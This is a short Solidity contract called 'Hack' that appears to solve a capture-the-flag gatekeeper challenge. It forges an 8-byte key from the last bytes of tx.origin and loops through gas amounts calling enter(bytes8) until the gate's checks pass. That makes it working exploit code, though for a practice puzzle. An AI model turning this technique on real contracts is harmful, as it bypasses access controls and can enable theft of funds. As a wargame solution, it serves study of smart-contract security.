// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    event Entered(bool success);

    function enterGate(address _gateAddr) public returns (bool) {
      bytes8 key = 0x1111111100000000;
      bytes memory keyArray = abi.encodePacked(key);

      // Extracts last 2 bytes of an address: 0x000...1234 --> 0x1234
      bytes2 lastTwo = bytes2(uint16(uint160(tx.origin)));
      bytes memory lastTwoArray = abi.encodePacked(lastTwo);
      // To pass gate 3 part 3
      keyArray[6] = lastTwoArray[0];
      keyArray[7] = lastTwoArray[1];

      bytes8 gateKey = bytes8(keyArray);
      
      bool succeeded = false;

      for (uint i = 0; i < 300; i++) {
        (bool success, ) = address(_gateAddr).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (success) {
          succeeded = success;
          break;
        }
      }

      emit Entered(succeeded);

      return succeeded;
    }
}